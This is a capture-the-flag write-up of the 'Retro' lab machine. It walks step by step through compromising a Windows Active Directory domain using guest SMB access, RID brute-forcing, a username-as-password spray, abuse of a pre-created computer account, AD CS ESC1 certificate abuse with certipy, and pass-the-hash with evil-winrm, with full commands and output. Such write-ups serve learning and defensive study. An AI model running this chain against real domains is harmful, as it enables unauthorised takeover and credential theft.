# Box intro
Retro is a easy active directory box where we enumerate a share, find out that the `trainee` user has a weak password, enumerate users, and then make a users.txt and pass the pass the password as the usernames from the user.txt and find out that one did indeed work and from there, we enumerate another share and exploit "Pre Created Computer Accounts" which was really fun. And then we exploit AD CS ESC1 and get Administrator

# Box info
**Name:** Retro  
**OS:** Windows / Active Directory  
**Creator:** r0BIT  
**Writeup Author:** zedd9001  

# Network enumeration 
## Scan explanation

```
rustscan -a 10.10.xx.xx -- -sC -sV -Pn -oN nmap/full-tcp.nmap
```
`-a 10.10.xx.xx` -> Scan the address (`-a`) of `10.10.11.74`   
`--`  -> Pass the found ports to `NMAP` and run the following `NMAP` flags  
`-sC` -> Enumerate with `NMAP`'s default scripts (`--script=default`) for basic enumeration (e.g., service info, SSL certs, and more)  
`-sV` -> Detect and enumerate version  
`-Pn` -> Don't ping the box and assume it's up (I do this for windows boxes)  
`-oN nmap/full-tcp.nmap` -> Output the file in a normal readable format and store it at the `nmap` directory and call it `full-tcp.nmap`

## Scan results
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-27 17:43:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-11-27T17:26:51
|_Not valid after:  2026-11-27T17:26:51
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-11-27T17:26:51
|_Not valid after:  2026-11-27T17:26:51
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-11-27T17:26:51
|_Not valid after:  2026-11-27T17:26:51
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-11-27T17:26:51
|_Not valid after:  2026-11-27T17:26:51
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-27T17:44:46+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-27T17:44:06+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-11-26T17:35:36
|_Not valid after:  2026-05-28T17:35:36
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
I added both dc.retro.vl and retro.vl to my `/etc/hosts` file so that the IP resolves to the domain controller’s hostname and the domain name
# SMB enumeration
I tried null based authentication, but that didn't work, then I tried guest authentication and it worked!
```
nxc smb dc.retro.vl -u 'aaaa' -p ''
```
so basically, if you authenticate as a user that doesn't exist with any password, you can authenticate as a Guest

```
zack@e6~$ nxc smb dc.retro.vl -u 'zedd9001' -p ''
SMB         10.10.122.201   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.122.201   445    DC               [+] retro.vl\zedd9001:a (Guest)
```
As you can see, we authenticated as a Guest user here

## Enumeration as Guest
Let's enumerate shares because that's a common thing to check
```
nxc smb dc.retro.vl -u 'zedd9001' -p '' --shares
```
```
SMB         10.10.122.201   445    DC               [+] retro.vl\zedd9001: (Guest)
SMB         10.10.122.201   445    DC               [*] Enumerated shares
SMB         10.10.122.201   445    DC               Share           Permissions     Remark
SMB         10.10.122.201   445    DC               -----           -----------     ------
SMB         10.10.122.201   445    DC               ADMIN$                          Remote Admin
SMB         10.10.122.201   445    DC               C$                              Default share
SMB         10.10.122.201   445    DC               IPC$            READ            Remote IPC
SMB         10.10.122.201   445    DC               NETLOGON                        Logon server share
SMB         10.10.122.201   445    DC               Notes                           
SMB         10.10.122.201   445    DC               SYSVOL                          Logon server share
SMB         10.10.122.201   445    DC               Trainees        READ            
```

So, we have two non-default shares that would be interesting to us   
One is `Trainees` that we do indeed have access to and the other is `Notes` which we don't have any access to  
Let's enumerate the `Trainees` share
```
smbclient -N \\\\dc.retro.vl\\Trainees
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jul 24 02:58:43 2023
  ..                                DHS        0  Wed Jul 26 14:54:14 2023
  Important.txt                       A      288  Mon Jul 24 03:00:13 2023
smb: \> get Important.txt
< SNIP >
smb: \> exit
```
Let's read the file:
```
cat Important.txt 
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```
So all of the trainees got moved into one account and potentially with a weak password? I guess we have to enumerate some users  
We can brute force RIDs (relative IDs)  
```
nxc smb dc.retro.vl -u 'zedd9001' -p '' --rid-brute
SMB         10.10.122.201   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.122.201   445    DC               [+] retro.vl\zedd9001: (Guest)
SMB         10.10.122.201   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.122.201   445    DC               500: RETRO\Administrator (SidTypeUser)
                           < SNIP >
SMB         10.10.122.201   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.10.122.201   445    DC               1109: RETRO\tblack (SidTypeUser)
```

I gathered all  the output and pasted it into ChatGPT to make a users.txt. I know there are more hacker ways to do this, but i'm noob :(  
I then tested all of the users with the users.txt
```
Administrator
Guest
krbtgt
DC$
trainee
BANKING$
jburley
tblack
krbtgt
DC$
BANKING$
```
I then tested all the users as their own usernames as the password:
```nxc smb dc.retro.vl -u users.txt -p users.txt --no-bruteforce --continue-on-success```
* The `--no-bruteforce` basically says that don't try all possible password combinations on one user  
* The `--continue-on-success` means that continue on success (obviously)    

```
SMB         10.10.122.201   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.122.201   445    DC               [-] retro.vl\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.122.201   445    DC               [-] retro.vl\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.122.201   445    DC               [-] retro.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.122.201   445    DC               [-] retro.vl\DC$:DC$ STATUS_LOGON_FAILURE 
SMB         10.10.122.201   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.10.122.201   445    DC               [-] retro.vl\BANKING$:BANKING$ STATUS_LOGON_FAILURE 
SMB         10.10.122.201   445    DC               [-] retro.vl\jburley:jburley STATUS_LOGON_FAILURE 
SMB         10.10.122.201   445    DC               [-] retro.vl\tblack:tblack STATUS_LOGON_FAILURE 
SMB         10.10.122.201   445    DC               [-] retro.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.122.201   445    DC               [-] retro.vl\DC$:DC$ STATUS_LOGON_FAILURE 
SMB         10.10.122.201   445    DC               [-] retro.vl\BANKING$:BANKING$ STATUS_LOGON_FAILURE 
```
Yoo the user `trainee` worked!!
## Enumeration as `trainee`
let's see if this user has access to the `Notes` share  
We indeed do:
```
$ nxc smb dc.retro.vl -u trainee -p trainee --shares
SMB         10.10.122.201   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.122.201   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.10.122.201   445    DC               [*] Enumerated shares
SMB         10.10.122.201   445    DC               Share           Permissions     Remark
SMB         10.10.122.201   445    DC               -----           -----------     ------
SMB         10.10.122.201   445    DC               ADMIN$                          Remote Admin
SMB         10.10.122.201   445    DC               C$                              Default share
SMB         10.10.122.201   445    DC               IPC$            READ            Remote IPC
SMB         10.10.122.201   445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.122.201   445    DC               Notes           READ            
SMB         10.10.122.201   445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.122.201   445    DC               Trainees        READ            
```
### Notes share enumeration
```
# Connecting to the share

$ smbclient -N \\\\dc.retro.vl\\Notes -U 'trainee%trainee'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jul 24 03:03:16 2023
  ..                                DHS        0  Wed Jul 26 14:54:14 2023
  ToDo.txt                            A      248  Mon Jul 24 03:05:56 2023

## Reading the contents

$ cat smb/ToDo.txt 
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```
Okay, let's research what "pre created computer accounts" are I guess
## Abusing Pre Created Computer Accounts
https://trustedsec.com/blog/diving-into-pre-created-computer-accounts < really fun read

So, from that article: 

> A pre created computer account with “**Assign this computer account as a pre-Windows 2000 computer**” checkmark enabled, will have the same password as the username but lowercase
> For instance, the computer account DavesLaptop$ would have the password daveslaptop


Testing it out with BANKING$ 

```
$ nxc smb dc.retro.vl -u 'BANKING$' -p 'banking' --shares
SMB         10.10.89.244    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.89.244    445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```
> STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT when you have guessed the correct password for a computer account that has not been used yet. The same error can also be seen with other tools such as CrackMapExec.
Yooo, so it worked


I thought I needed to change the password of the account because I couldn't do anything as of now, but I couldn't change the password with any tool, then I checked the blog post again to see if this was mentioned or not. Turns out, you can just request a TGT (ticket granting ticket) from the KDC and you can use the account normally 
> 12 May, 2022 - After publishing this post on Twitter @filip_dragovic showed that you can basically just use getTGT.py to get a kerberos ticket and use that instead of the password. Doing it that way you do not have to change the actual password for the account in order to use it.

### Getting  the  TGT
```
zack@e6~$ getTGT.py 'retro.vl/BANKING$:banking'
Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in BANKING$.ccache
```
To use this TGT, you can just do
```
export KRB5CCNAME=BANKING\$.ccache 
```
# Enumerating AD CS
Let's find some vulnerable templates
```
certipy find -k -u 'BANKING$'  -p trainee -vulnerable -stdout -target dc.retro.vl
```

There is one vulnerable template called RetroClients that is vulnerable to ESC1
```
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
Requesting the Administrator users PFX
```
$ certipy req -k -no-pass -ca retro-DC-CA -upn Administrator -template RetroClients -target dc.retro.vl -key-size 4096
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

NOTE: You have to do `export KRB5CCNAME=<TGT of BANKING$>` before this

Then we can get the hash: 

```
$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.10.122.201
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:<REDACTED>
```
Then, you can just do a Pass-The-Hash technique with evil-winrm
```
evil-winrm -i retro.vl -u Administrator -H < HASH HERE > 
```

# Thoughts
This was a really nice, beginner friendly machine that taught me a lot of new things. Vulnlab is amazing
